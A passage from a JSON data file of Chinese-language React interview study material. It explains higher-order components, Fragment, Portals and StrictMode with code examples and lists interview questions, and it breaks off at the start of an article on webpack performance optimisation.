       return function renderWrapComponent(props){\n          const dep = rule(props)\n          const RenderElement = useMemo(() =>  <Component {...props}  /> ,[ dep ])\n          return RenderElement\n        }\n     }\n}\n/* 只有 props 中 num 变化 ，渲染组件  */\n@HOC( (props)=> props['num'])\nclass IndexHoc extends React.Component{\n  render(){\n     console.log(`组件一渲染`,this.props)\n     return <div> 组件一 ： hello,world </div>\n  }\n}\n\n/* 只有 props 中 num1 变化 ，渲染组件  */\n@HOC((props)=> props['num1'])\nclass IndexHoc1 extends React.Component{\n  render(){\n     console.log(`组件二渲染`,this.props)\n     return <div> 组件二 ： my name is alien </div>\n  }\n}\nexport default ()=> {\n    const [ num ,setNumber ] = useState(0)\n    const [ num1 ,setNumber1 ] = useState(0)\n    const [ num2 ,setNumber2 ] = useState(0)\n    return <div>\n        <IndexHoc  num={ num } num1={num1} num2={ num2 }  />\n        <IndexHoc1  num={ num } num1={num1} num2={ num2 }  />\n        <button onClick={() => setNumber(num + 1) } >num++</button>\n        <button onClick={() => setNumber1(num1 + 1) } >num1++</button>\n        <button onClick={() => setNumber2(num2 + 1) } >num2++</button>\n    </div>\n}\n```\n\n**效果**\n\n![hoc2.gif](https://static.ecool.fun//article/364393b6-9c2f-43c0-aee6-f1ceaeb3e18d.awebp)\n\n完美实现了效果。这用高阶组件模式，可以灵活控制`React`组件层面上的，**`props`数据流**和**更新流**，优秀的高阶组件有 `mobx` 中`observer` ,`inject` , `react-redux`中的`connect`,感兴趣的同学，可以抽时间研究一下。\n\n## 3 赋能组件\n\n高阶组件除了上述两种功能之外，还可以赋能组件，比如加一些**额外`生命周期`**，**劫持事件**，**监控日志**等等。\n\n### 3.1 劫持原型链-劫持生命周期，事件函数\n\n#### ① 属性代理实现\n\n```js\nfunction HOC (Component){\n  const proDidMount = Component.prototype.componentDidMount \n  Component.prototype.componentDidMount = function(){\n     console.log('劫持生命周期：componentDidMount')\n     proDidMount.call(this)\n  }\n  return class wrapComponent extends React.Component{\n      render(){\n        return <Component {...this.props}  />\n      }\n  }\n}\n@HOC\nclass Index extends React.Component{\n   componentDidMount(){\n     console.log('———didMounted———')\n   }\n   render(){\n     return <div>hello,world</div>\n   }\n}\n```\n\n**效果**\n\n![A04A37C8-71CF-4DFD-BD59-E741DCC35EF4.jpg](https://static.ecool.fun//article/cdfc9983-69a9-407d-9559-fd56742b5f9a.awebp)\n\n#### ② 反向继承实现\n\n反向继承，因为在继承原有组件的基础上，可以对原有组件的**生命周期**或**事件**进行劫持，甚至是替换。\n\n```js\nfunction HOC (Component){\n  const didMount = Component.prototype.componentDidMount\n  return class wrapComponent extends Component{\n      componentDidMount(){\n        console.log('------劫持生命周期------')\n        if (didMount) {\n           didMount.apply(this) /* 注意 `this` 指向问题。 */\n        }\n      }\n      render(){\n        return super.render()\n      }\n  }\n}\n\n@HOC\nclass Index extends React.Component{\n   componentDidMount(){\n     console.log('———didMounted———')\n   }\n   render(){\n     return <div>hello,world</div>\n   }\n}\n```\n\n### 3.2 事件监控\n\n`HOC`还可以对原有组件进行监控。比如对一些`事件监控`，`错误监控`，`事件监听`等一系列操作。\n\n#### ① 组件内的事件监听\n\n接下来，我们做一个`HOC`,只对组件内的点击事件做一个监听效果。\n\n```js\n\nfunction ClickHoc (Component){\n  return  function Wrap(props){\n    const dom = useRef(null)\n    useEffect(()=>{\n     const handerClick = () => console.log('发生点击事件') \n     dom.current.addEventListener('click',handerClick)\n     return () => dom.current.removeEventListener('click',handerClick)\n    },[])\n    return  <div ref={dom}  ><Component  {...props} /></div>\n  }\n}\n\n@ClickHoc\nclass Index extends React.Component{\n   render(){\n     return <div  className='index'  >\n       <p>hello，world</p>\n       <button>组件内部点击</button>\n    </div>\n   }\n}\nexport default ()=>{\n  return <div className='box'  >\n     <Index />\n     <button>组件外部点击</button>\n  </div>\n}\n```\n\n**效果**\n\n![click.gif](https://static.ecool.fun//article/72c57a1d-d1c0-4b2e-a24f-8fefa142193a.awebp)\n\n### 3 ref助力操控组件实例\n\n对于属性代理我们虽然不能直接获取组件内的状态，但是我们可以通过`ref`获取组件实例,获取到组件实例，就可以获取组件的一些状态，或是手动触发一些事件，进一步强化组件，但是注意的是：`class`声明的有状态组件才有实例，`function`声明的无状态组件不存在实例。\n\n#### ① 属性代理-添加额外生命周期\n\n我们可以针对某一种情况, 给组件增加额外的生命周期，我做了一个简单的`demo`，监听`number`改变，如果`number`改变，就自动触发组件的监听函数`handerNumberChange`。 具体写法如下\n\n```js\nfunction Hoc(Component){\n  return class WrapComponent extends React.Component{\n      constructor(){\n        super()\n        this.node = null\n      }\n      UNSAFE_componentWillReceiveProps(nextprops){\n          if(nextprops.number !== this.props.number ){\n            this.node.handerNumberChange  &&  this.node.handerNumberChange.call(this.node)\n          }\n      }\n      render(){\n        return <Component {...this.props} ref={(node) => this.node = node }  />\n      }\n  }\n}\n@Hoc\nclass Index extends React.Component{\n  handerNumberChange(){\n      /* 监听 number 改变 */\n  }\n  render(){\n    return <div>hello,world</div>\n  }\n}\n```\n\n这种写法有点不尽人意，大家不要着急，在第四部分，源码实战中，我会介绍一种更好的场景。方便大家理解`Hoc`对原有组件的赋能。\n\n## 4 总结\n\n上面我分别按照`hoc`主要功能，**强化props** ， **控制渲染** ，**赋能组件** 三个方向对`HOC`编写做了一个详细介绍，和应用场景的介绍，目的**让大家在理解高阶组件的时候，更明白什么时候会用到？,怎么样去写？\\`** 里面涵盖的知识点我总一个总结。\n\n对于属性代理HOC，我们可以：\n\n-   强化props & 抽离state。\n-   条件渲染，控制渲染，分片渲染，懒加载。\n-   劫持事件和生命周期\n-   ref控制组件实例\n-   添加事件监听器，日志\n\n对于反向代理的HOC,我们可以：\n\n-   劫持渲染，操纵渲染树\n-   控制/替换生命周期，直接获取组件状态，绑定事件。\n\n每个应用场景，我都举了例子🌰🌰，大家可以结合例子深入了解一下其原理和用途。\n\n# 四 高阶组件源码级实践\n\n`hoc`的应用场景有很多，也有很多好的开源项目，供我们学习和参考，接下来我真对三个方向上的功能用途，分别从源码角度解析`HOC`的用途。\n\n## 1 强化prop- withRoute\n\n用过`withRoute`的同学，都明白其用途，`withRoute`用途就是，对于没有被`Route`包裹的组件，给添加`history`对象等和路由相关的状态，方便我们在任意组件中，都能够获取路由状态，进行路由跳转，这个`HOC`目的很清楚，就是强化`props`,把`Router`相关的状态都混入到`props`中，我们看看具体怎么实现的。\n\n```js\n\nfunction withRouter(Component) {\n  const displayName = `withRouter(${Component.displayName || Component.name})`;\n  const C = props => {\n      /*  获取 */\n    const { wrappedComponentRef, ...remainingProps } = props;\n    return (\n      <RouterContext.Consumer>\n        {context => {\n          return (\n            <Component\n              {...remainingProps}\n              {...context}\n              ref={wrappedComponentRef}\n            />\n          );\n        }}\n      </RouterContext.Consumer>\n    );\n  };\n\n  C.displayName = displayName;\n  C.WrappedComponent = Component;\n  /* 继承静态属性 */\n  return hoistStatics(C, Component);\n}\n\nexport default withRouter\n```\n\n`withRoute`的流程实际很简单，就是先从`props`分离出`ref`和`props`,然后从存放整个`route`对象上下文`RouterContext`取出`route`对象,然后混入到原始组件的`props`中，最后用`hoistStatics`继承静态属性。至于`hoistStatics`我们稍后会讲到。\n\n## 2 控制渲染案例 connect\n\n由于`connect`源码比较长和难以理解，所以我们提取精髓，精简精简再精简, 总结的核心功能如下,`connect`的作用也有`合并props`，但是更重要的是接受`state`，来控制更新组件。下面这个代码中，为了方便大家理解，我都给简化了。希望大家能够理解`hoc`如何**派发**和**控制**更新流的。\n\n```js\nimport store from './redux/store'\nimport { ReactReduxContext } from './Context'\nimport { useContext } from 'react'\nfunction connect(mapStateToProps){\n   /* 第一层： 接收订阅state函数 */\n    return function wrapWithConnect (WrappedComponent){\n        /* 第二层：接收原始组件 */\n        function ConnectFunction(props){\n            const [ , forceUpdate ] = useState(0)\n            const { reactReduxForwardedRef ,...wrapperProps } = props\n            \n            /* 取出Context */\n            const { store } = useContext(ReactReduxContext)\n\n            /* 强化props：合并 store state 和 props  */\n            const trueComponentProps = useMemo(()=>{\n                  /* 只有props或者订阅的state变化，才返回合并后的props */\n                 return selectorFactory(mapStateToProps(store.getState()),wrapperProps) \n            },[ store , wrapperProps ])\n\n            /* 只有 trueComponentProps 改变时候,更新组件。  */\n            const renderedWrappedComponent = useMemo(\n              () => (\n                <WrappedComponent\n                  {...trueComponentProps}\n                  ref={reactReduxForwardedRef}\n                />\n              ),\n              [reactReduxForwardedRef, WrappedComponent, trueComponentProps]\n            )\n            useEffect(()=>{\n              /* 订阅更新 */\n               const checkUpdate = () => forceUpdate(new Date().getTime())\n               store.subscribe( checkUpdate )\n            },[ store ])\n            return renderedWrappedComponent\n        }\n        /* React.memo 包裹  */\n        const Connect = React.memo(ConnectFunction)\n\n        /* 处理hoc,获取ref问题 */  \n        if(forwardRef){\n          const forwarded = React.forwardRef(function forwardConnectRef( props,ref) {\n            return <Connect {...props} reactReduxForwardedRef={ref} reactReduxForwardedRef={ref} />\n          })\n          return hoistStatics(forwarded, WrappedComponent)\n        } \n        /* 继承静态属性 */\n        return hoistStatics(Connect,WrappedComponent)\n    } \n}\nexport default Index\n```\n\n`connect` 涉及到的功能点还真不少呢，首先第一层接受订阅函数，第二层接收原始组件，然后用`forwardRef`处理`ref`,用`hoistStatics` 处理静态属性的继承，在包装组件内部，合并`props`,`useMemo`缓存原始组件，只有合并后的`props`发生变化，才更新组件，然后在`useEffect`内部通过`store.subscribe()`订阅更新。这里省略了`Subscription`概念，真正的`connect`中有一个`Subscription`专门负责订阅消息。\n\n## 3 赋能组件-缓存生命周期 keepaliveLifeCycle\n\n之前笔者写了一个`react`缓存页面的开源库`react-keepalive-router`，可以实现`vue`中 `keepalive` + `router`功能，最初的版本没有缓存周期的，但是后来热心读者，期望在被缓存的路由组件中加入缓存周期，类似`activated`这种的，后来经过我的分析打算用`HOC`来实现此功能。\n\n于是乎 `react-keepalive-router`加入了全新的页面组件生命周期 `actived` 和 `unActived`, `actived` 作为缓存路由组件激活时候用，初始化的时候会默认执行一次 , `unActived` 作为路由组件缓存完成后调用。但是生命周期需要用一个 `HOC` 组件`keepaliveLifeCycle` 包裹。\n\n使用\n\n```js\nimport React   from 'react'\nimport { keepaliveLifeCycle } from 'react-keepalive-router'\n\n@keepaliveLifeCycle\nclass index extends React.Component<any,any>{\n\n    state={\n        activedNumber:0,\n        unActivedNumber:0\n    }\n    actived(){\n        this.setState({\n            activedNumber:this.state.activedNumber + 1\n        })\n    }\n    unActived(){\n        this.setState({\n            unActivedNumber:this.state.unActivedNumber + 1\n        })\n    }\n    render(){\n        const { activedNumber , unActivedNumber } = this.state\n        return <div  style={{ marginTop :'50px' }}  >\n           <div> 页面 actived 次数： {activedNumber} </div>\n           <div> 页面 unActived 次数：{unActivedNumber} </div>\n        </div>\n    }\n}\nexport default index\n```\n\n**效果：**\n\n![lifecycle.gif](https://static.ecool.fun//article/d4e4a8a1-73e7-46c4-9f10-28f72461808a.awebp)\n\n**原理**\n\n```js\nimport {lifeCycles} from '../core/keeper'\nimport hoistNonReactStatic from 'hoist-non-react-statics'\nfunction keepaliveLifeCycle(Component) {\n   class Hoc extends React.Component {\n    cur = null\n    handerLifeCycle = type => {\n      if (!this.cur) return\n      const lifeCycleFunc = this.cur[type]\n      isFuntion(lifeCycleFunc) && lifeCycleFunc.call(this.cur)\n    }\n    componentDidMount() { \n      const {cacheId} = this.props\n      cacheId && (lifeCycles[cacheId] = this.handerLifeCycle)\n    }\n    componentWillUnmount() {\n      const {cacheId} = this.props\n      delete lifeCycles[cacheId]\n    }\n     render=() => <Component {...this.props} ref={cur => (this.cur = cur)}/>\n  }\n  return hoistNonReactStatic(Hoc,Component)\n}\n```\n\n`keepaliveLifeCycle` 的原理很简单，就是通过`ref`或获取 `class` 组件的实例,在 `hoc` 初始化时候**进行生命周期的绑定**, 在 `hoc` 销毁阶段，对生命周期进行解绑, 然后交给`keeper`统一调度，`keeper`通过调用实例下面的生命周期函数，来实现缓存生命周期功能的。\n\n# 五 高阶组件的注意事项\n\n## 1 谨慎修改原型链\n\n```js\nfunction HOC (Component){\n  const proDidMount = Component.prototype.componentDidMount \n  Component.prototype.componentDidMount = function(){\n     console.log('劫持生命周期：componentDidMount')\n     proDidMount.call(this)\n  }\n  return  Component\n}\n```\n\n这样做会产生一些不良后果。比如如果你再用另一个同样会修改 `componentDidMount` 的 `HOC` 增强它，那么前面的 `HOC` 就会失效！同时，这个 `HOC` 也无法应用于没有生命周期的函数组件。\n\n## 2 继承静态属性\n\n在用属性代理的方式编写`HOC`的时候，要注意的是就是，静态属性丢失的问题，前面提到了，如果不做处理，静态方法就会全部丢失。\n\n### 手动继承\n\n我们可以手动将原始组件的静态方法`copy`到 `hoc`组件上来，但前提是必须准确知道应该拷贝哪些方法。\n\n```js\nfunction HOC(Component) {\n  class WrappedComponent extends React.Component {\n      /*...*/\n  }\n  // 必须准确知道应该拷贝哪些方法 \n  WrappedComponent.staticMethod = Component.staticMethod\n  return WrappedComponent\n}\n```\n\n### 引入第三方库\n\n这样每个静态方法都绑定会很累，尤其对于开源的`hoc`，**对原生组件的静态方法是未知的**,我们可以使用 `hoist-non-react-statics` 自动拷贝所有的静态方法:\n\n```js\nimport hoistNonReactStatic from 'hoist-non-react-statics'\nfunction HOC(Component) {\n  class WrappedComponent extends React.Component {\n      /*...*/\n  }\n  hoistNonReactStatic(WrappedComponent,Component)\n  return WrappedComponent\n}\n```\n\n## 3 跨层级捕获ref\n\n高阶组件的约定是将所有 `props` 传递给被包装组件，但这对于 `refs` 并不适用。那是因为 `ref` 实际上并不是一个 `prop` - 就像 `key` 一样，它是由 `React` 专门处理的。如果将 `ref` 添加到 `HOC` 的返回组件中，则 `ref` 引用指向容器组件，而不是被包装组件。我们可以通过`forwardRef`来解决这个问题。\n\n```js\n/**\n * \n * @param {*} Component 原始组件\n * @param {*} isRef  是否开启ref模式\n */\nfunction HOC(Component,isRef){\n  class Wrap extends React.Component{\n     render(){\n        const { forwardedRef ,...otherprops  } = this.props\n        return <Component ref={forwardedRef}  {...otherprops}  />\n     }\n  }\n    if(isRef){\n      return  React.forwardRef((props,ref)=> <Wrap forwardedRef={ref} {...props} /> )\n    }\n    return Wrap\n}\n\nclass Index extends React.Component{\n  componentDidMount(){\n      console.log(666)\n  }\n  render(){\n    return <div>hello,world</div>\n  }\n}\n\nconst HocIndex =  HOC(Index,true)\n\nexport default ()=>{\n  const node = useRef(null)\n  useEffect(()=>{\n     /* 就可以跨层级，捕获到 Index 组件的实例了 */ \n    console.log(node.current.componentDidMount)\n  },[])\n  return <div><HocIndex ref={node}  /></div>\n}\n```\n\n**打印结果：**\n\n![forwardRef.jpg](https://static.ecool.fun//article/4d41dfc2-ff2a-40ed-a8df-d71ed903fab4.awebp)\n\n如上就解决了,`HOC`跨层级捕获`ref`的问题。\n\n## 4 render中不要声明HOC\n\n🙅错误写法：\n\n```js\nclass Index extends React.Component{\n  render(){\n     const WrapHome = HOC(Home)\n     return <WrapHome />\n  }\n}\n```\n\n如果这么写，会造成一个极大的问题，因为每一次`HOC`都会返回一个新的`WrapHome`,`react diff`会判定两次**不是同一个组件**，那么每次`Index` 组件 `render`触发，`WrapHome`，会重新挂载，状态会**全都丢失**。如果想要动态绑定`HOC`,请参考如下方式。\n\n🙆正确写法：\n\n```js\nconst WrapHome = HOC(Home)\nclass index extends React.Component{\n  render(){\n     return <WrapHome />\n  }\n}\n```\n",
    "testPoint": "1. **高阶组件的定义**：\n   - 请解释什么是高阶组件（HOC），并给出一个简单的例子。\n   - 高阶组件与普通组件、函数组件以及类组件之间有何区别？\n\n2. **高阶组件的用途**：\n   - 高阶组件在React中主要用于什么目的？\n   - 能否列举几个实际场景中高阶组件的应用？\n\n1. **HOC的实现方式**：\n   - 请描述如何编写一个简单的高阶组件。\n   - 在实现HOC时，需要注意哪些事项？\n\n2. **属性代理与反向继承**：\n   - 什么是属性代理（Props Proxying）和反向继承（Render Props Technique）？\n   - 能否分别给出一个使用属性代理和反向继承实现高阶组件的例子？\n\n1. **状态管理**：\n   - 如何使用高阶组件来管理React组件的状态？\n   - 能否给出一个使用HOC实现状态管理的示例？\n\n2. **权限控制**：\n   - 在React应用中，如何使用高阶组件实现权限控制？\n   - 能否展示一个包含权限验证逻辑的高阶组件示例？\n\n\n",
    "exerciseKeyList": "[\"dcb3eab5-6a15-43e1-90bb-b6bb2a17697c\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:47:46.000Z",
    "updateAt": "2025-03-14T08:33:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "dcb3eab5-6a15-43e1-90bb-b6bb2a17697c",
        "title": "什么是高阶组件？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:43:16.000Z",
        "updateAt": "2024-08-10T17:04:55.000Z"
      }
    ]
  },
  "204": {
    "id": 204,
    "tagId": 13,
    "title": "Fragment 和 Portals",
    "explanation": "\n## 一、Portals\n\n某些情况下，我们希望渲染的内容独立于父组件，甚至独立于当前挂在的DOM元素（默认都是挂载到id为root的DOM元素上的）\n\nPortal提供了一种将子节点渲染到存在于**父组件以外的DOM节点**的优秀的方案：\n\n```scss\nReactDOM.createPortal(child, container)\n```\n\n第一个参数：是任何可渲染的React子元素，例如**一个元素、字符串或fragment** 第二个参数：是一个DOM元素\n\n通常来讲，当你从组件的 render 方法返回一个元素时，该元素将被挂载到 DOM 节点中离其最近的父节点：\n\n```javascript\nrender() {\n  // React 挂载了一个新的 div，并且把子元素渲染其中\n  return (\n    <div>\n      {this.props.children}\n    </div>\n  );\n}\n```\n\n然而，有时候将子元素插入到 DOM 节点中的不同位置也是有好处的：\n\n```javascript\nrender() {\n  // React 并没有创建一个新的 div。它只是把子元素渲染到 `domNode` 中。\n  // `domNode` 是一个可以在任何位置的有效 DOM 节点。\n  return ReactDOM.createPortal(\n    this.props.children,\n    domNode\n  );\n}\n```\n\n一个 portal 的典型用例是当父组件有 overflow: hidden 或 z-index 样式时，但你需要子组件能够在视觉上“跳出”其容器。**例如，对话框、悬浮卡以及提示框**\n\n### 案例\n\n比如将h2挂在到id为zs的节点下\n\n**index.html**\n\n```xml\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <link rel=\"icon\" href=\"%PUBLIC_URL%/favicon.ico\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <meta name=\"theme-color\" content=\"#000000\" />\n    <meta\n      name=\"description\"\n      content=\"Web site created using create-react-app\"\n    />\n    <link rel=\"apple-touch-icon\" href=\"%PUBLIC_URL%/logo192.png\" />\n    <link rel=\"manifest\" href=\"%PUBLIC_URL%/manifest.json\" />\n    <title>React App</title>\n  </head>\n  <body>\n    <noscript>You need to enable JavaScript to run this app.</noscript>\n    <div id=\"root\"></div>\n    <div id=\"zs\"></div>\n  </body>\n</html>\n```\n\n**App.jsx**\n\n```javascript\nimport React, { PureComponent } from 'react'\nimport { createPortal } from \"react-dom\"\n\nexport class App extends PureComponent {\n  render() {\n    return (\n      <div className='app'>\n        <h1>App H1</h1>\n        {\n          createPortal(<h2>App H2</h2>, document.querySelector(\"#zs\"))\n        }\n      </div>\n    )\n  }\n}\n\nexport default App\n```\n\n![](https://static.ecool.fun//article/3cfab24d-80da-46b7-a21a-bb8e132e1d63.awebp)\n\n### 使用场景\n\n比如，开发一个Modal组件，它可以将它的子组件渲染到屏幕的中间位置\n\n1.  为index.html添加新的节点（用于挂在Modal组件）\n2.  为挂载节点添加样式\n\n```xml\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <link rel=\"icon\" href=\"%PUBLIC_URL%/favicon.ico\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <meta name=\"theme-color\" content=\"#000000\" />\n    <meta\n      name=\"description\"\n      content=\"Web site created using create-react-app\"\n    />\n    <link rel=\"apple-touch-icon\" href=\"%PUBLIC_URL%/logo192.png\" />\n    <link rel=\"manifest\" href=\"%PUBLIC_URL%/manifest.json\" />\n    <title>React App</title>\n    <style>\n      #modal {\n        position: fixed;\n        left: 50%;\n        top: 50%;\n        transform: translate(-50%, -50%);\n      }\n    </style>\n  </head>\n  <body>\n    <noscript>You need to enable JavaScript to run this app.</noscript>\n    <div id=\"root\"></div>\n    <div id=\"modal\"></div>\n  </body>\n</html>\n```\n\n3.  编写组件代码并将组件挂在至新节点上\n\n**Modal.jsx**\n\n```scala\nimport { PureComponent } from 'react'\nimport { createPortal } from \"react-dom\"\n\nexport class Modal extends PureComponent {\n  render() {\n    return createPortal(this.props.children, document.querySelector(\"#modal\"))\n  }\n}\n\nexport default Modal\n```\n\n**App.jsx**\n\n```javascript\nimport React, { PureComponent } from 'react'\nimport { createPortal } from \"react-dom\"\nimport Modal from './Modal'\n\nexport class App extends PureComponent {\n  render() {\n    return (\n      <div className='app'>\n        {/* Modal组件 */}\n        <Modal>\n          <h2>我是标题</h2>\n          <p>我是内容, 哈哈哈</p>\n        </Modal>\n      </div>\n    )\n  }\n}\n\nexport default App\n```\n\n## 二、Fragment\n\n在之前开发中，总是要在一个组件返回的内容外包裹一个div元素，如果我们又要保持内容外包裹一个根元素，但又不希望渲染出来一个div，怎么操作呢？\n\n此时要使用Fragment\n\n+   Fragment允许你将子列表进行分组，而无需向DOM添加额外节点\n+   React中还提供了Fragment的短语法： **<></>**\n+   **需要注意的是，如果想在Fragment上添加key，就不能使用短语法<></>**\n\n### 基本使用方法\n\n```javascript\nimport React, { PureComponent, Fragment } from 'react'\n\nexport class App extends PureComponent {\n  constructor() {\n    super() \n\n    this.state = {\n      sections: [\n        { title: \"1\", content: \"我是内容1\" },\n        { title: \"2\", content: \"我是内容2\" },\n        { title: \"3\", content: \"我是内容3\" },\n        { title: \"4\", content: \"我是内容4\" },\n      ]\n    }\n  }\n\n  render() {\n    const { sections } = this.state\n\n    return (\n      <>\n        <h2>我是App的标题</h2>\n        <p>我是App的内容, 哈哈哈哈</p>\n        <hr />\n\n        {\n          sections.map(item => {\n            return (\n              // 添加key，必须使用Fragment\n              <Fragment key={item.title}>\n                <h2>{item.title}</h2>\n                <p>{item.content}</p>\n              </Fragment>\n            )\n          })\n        }\n      </>\n    )\n  }\n}\n\nexport default App\n```\n\n## 三、StrictMode\n\n**StrictMode 是一个用来突出显示应用程序中潜在问题的工具:**\n\n+   与 Fragment 一样，StrictMode 不会渲染任何可见的 UI\n+   它为其后代元素触发额外的检查和警告\n+   严格模式检查仅在开发模式下运行、它们不会影响生产构建;\n\n### 严格模式检查的是什么？\n\n1.  识别不安全的生命周期\n2.  校验是否使用过时的ref API\n\n> 比如，是否通过this.refs.xx的方式来使用ref\n> \n> 如何在React18中正确使用ref，详见文章[React18中如何正确使用ref](https://juejin.cn/post/7153831816296660999 \"https://juejin.cn/post/7153831816296660999\")\n\n3.  检查意外的副作用\n\n> 这个组件的constructor会被调用两次\n> \n> 这是严格模式下故意进行的操作，让你来查看在这里写的一些逻辑代码被调用多次时，是否会产生一些副作用，在生产环境中，是不会被调用两次的\n\n4.  是否使用废弃的findDOMNode方法\n\n> 在之前的React API中，可以通过findDOMNode来获取DOM，不过已经不推荐使用了\n\n5.  检测是否使用过时的context API\n\n> 早期的Context是通过static属性声明Context对象属性，通过getChildContext返回Context对象等方式来使用Context的\n\n**Home.jsx**\n\n```javascript\nimport React, { PureComponent } from 'react'\n\nexport class Home extends PureComponent {\n  constructor(props) {\n    super(props)\n\n    console.log(\"Home Constructor\")\n  }\n\n  componentDidMount() {\n    console.log(\"Home componentDidMount\")\n  }\n\n  render() {\n    console.log(\"Home Render\")\n\n    return (\n      <div>\n        <h2>Home</h2>\n      </div>\n    )\n  }\n}\n\nexport default Home\n```\n\n**App.jsx**\n\n```javascript\nimport React, { PureComponent, StrictMode } from 'react'\nimport Home from './pages/Home'\nimport Profile from './pages/Profile'\n\nexport class App extends PureComponent {\n  render() {\n    return (\n      <div>\n        <StrictMode>\n          <Home/>\n        </StrictMode>\n      </div>\n    )\n  }\n}\n\nexport default App\n```\n\n![](https://static.ecool.fun//article/02303000-be70-49f7-aa24-e62574fe29e7.awebp)",
    "testPoint": "\n### React Fragment\n\n1. **Fragment的基本概念**：\n   - 请解释什么是React Fragment，以及它解决了什么问题。\n   - Fragment与普通的div包裹元素相比，有何优势？\n\n2. **Fragment的使用场景**：\n   - 在哪些情况下，你会选择使用React Fragment？\n   - 能否给出一个使用Fragment来避免不必要的DOM层级的示例？\n\n3. **Fragment的语法**：\n   - 请展示如何使用短语法和长语法来定义一个Fragment。\n   - 在Fragment内部，如何传递props给子组件？\n\n### React Portals\n\n1. **Portals的基本概念**：\n   - 请解释什么是React Portals，以及它的主要用途是什么。\n   - Portals如何帮助我们将子组件渲染到父组件DOM层次结构之外？\n\n2. **Portals的使用场景**：\n   - 在哪些情况下，你会选择使用React Portals？\n   - 能否给出一个使用Portals来渲染模态框或工具提示的示例？\n\n3. **Portals的实现细节**：\n   - 请描述如何创建一个Portal，并将其附加到DOM中的特定节点。\n   - 在使用Portals时，如何管理事件和生命周期方法？\n\n",
    "exerciseKeyList": "[\"3b6458bc-88e6-4c91-a81d-0b14e5464332\",\"3db534b5-5ef5-44e8-b156-54ee7f1bcc70\",\"19da1c13-87a9-4fb4-98ae-0af28c7f03e6\"]",
    "vipLimit": 1,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:50:51.000Z",
    "updateAt": "2025-03-14T08:35:11.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "19da1c13-87a9-4fb4-98ae-0af28c7f03e6",
        "title": "React Portals 有什么用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-02-23T07:37:57.000Z",
        "updateAt": "2025-10-09T06:06:13.000Z"
      },
      {
        "exerciseKey": "3b6458bc-88e6-4c91-a81d-0b14e5464332",
        "title": "说说你对 createPortal 的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:09:40.000Z"
      },
      {
        "exerciseKey": "3db534b5-5ef5-44e8-b156-54ee7f1bcc70",
        "title": "子组件是一个 Portal，发生点击事件能冒泡到父组件吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-04-19T01:39:34.000Z",
        "updateAt": "2024-07-22T10:11:18.000Z"
      }
    ]
  },
  "205": {
    "id": 205,
    "tagId": 13,
    "title": "性能优化",
    "explanation": "本文篇幅较长，将从 **编译阶段** -> **路由阶段** -> **渲染阶段** -> **细节优化** -> **状态管理** -> **海量数据源，长列表渲染**  方向分别加以探讨。\n\n## 一 不能输在起跑线上，优化babel配置,webpack配置为项\n\n### 1 真实项目中痛点\n\n当我们用`create-react-app`或者`webpack`构建`react`工程的时候，有没有想过一个问题，我们的配置能否让我们的项目更快的构建速度，更小的项目体积，更简洁清晰的项目结构。 随着我们的项目越做越大，项目依赖越来越多，项目结构越来越来复杂，项目体积就会越来越大，构建时间越来越长，久而久之就会成了一个又大又重的项目，所以说我们要学会适当的为项目‘减负’，让项目不能输在起跑线上。\n\n### 2 一个老项目\n\n拿我们之前接触过的一个`react`老项目为例。我们没有用`dva`,`umi`快速搭建react，而是用`react`老版本脚手架构建的，这对这种老的`react`项目，上述的问题都会存在，下面让我们一起来看看。\n\n我们首先看一下项目结构。 ![](https://static.ecool.fun//article/6b03030b-9a79-4726-8fd5-cb78cbea1bdc.awebp)\n\n再看看构建时间。\n\n为了方便大家看构建时间，我简单写了一个`webpack，plugin` `ConsolePlugin` ,记录了`webpack`在一次`compilation`所用的时间。\n\n```js\nconst chalk = require('chalk') /* console 颜色 */\nvar slog = require('single-line-log'); /* 单行打印 console */\n\nclass ConsolePlugin {\n    constructor(options){\n       this.options = options\n    }\n    apply(compiler){\n        /**\n         * Monitor file change 记录当前改动文件\n         */\n        compiler.hooks.watchRun.tap('ConsolePlugin', (watching) => {\n            const changeFiles = watching.watchFileSystem.watcher.mtimes\n            for(let file in changeFiles){\n                console.log(chalk.green('当前改动文件：'+ file))\n            }\n        })\n        /**\n         *  before a new compilation is created. 开始 compilation 编译 。\n         */\n        compiler.hooks.compile.tap('ConsolePlugin',()=>{\n            this.beginCompile()\n        })\n        /**\n         * Executed when the compilation has completed. 一次 compilation 完成。\n         */\n        compiler.hooks.done.tap('ConsolePlugin',()=>{\n            this.timer && clearInterval( this.timer )\n            const endTime =  new Date().getTime()\n            const time = (endTime - this.starTime) / 1000\n            console.log( chalk.yellow(' 编译完成') )\n            console.log( chalk.yellow('编译用时：' + time + '秒' ) )\n        })\n    }\n    beginCompile(){\n       const lineSlog = slog.stdout\n       let text  = '开始编译：'\n       /* 记录开始时间 */\n       this.starTime =  new Date().getTime()\n       this.timer = setInterval(()=>{\n          text +=  '█'\n          lineSlog( chalk.green(text))\n       },50)\n    }\n}\n```\n\n**构建时间如下：**\n\n![](https://static.ecool.fun//article/c8e48811-856a-477d-82db-3c672e70a8db.awebp)\n\n**打包后的体积：**\n\n![](https://static.ecool.fun//article/50d97bb4-1a50-4e92-9486-aaee679e4e29.awebp)\n\n### 3 翻新老项目\n\n针对上面这个`react`老项目，我们开始针对性的优化。由于本文主要讲的是`react`，所以我们不把太多篇幅给`webpack优化`上。\n\n#### ① include 或 exclude 限制 loader 范围。\n\n```js\n{\n    test: /\\.jsx?$/,\n    exclude: /node_modules/,\n    include: path.resolve(__dirname, '../src'),\n    use:['happypack/loader?id=babel']\n    // loader: 'babel-loader'\n}\n```\n\n#### ② happypack多进程编译\n\n除了上述改动之外，在plugin中\n\n```js\n/* 多线程编译 */\nnew 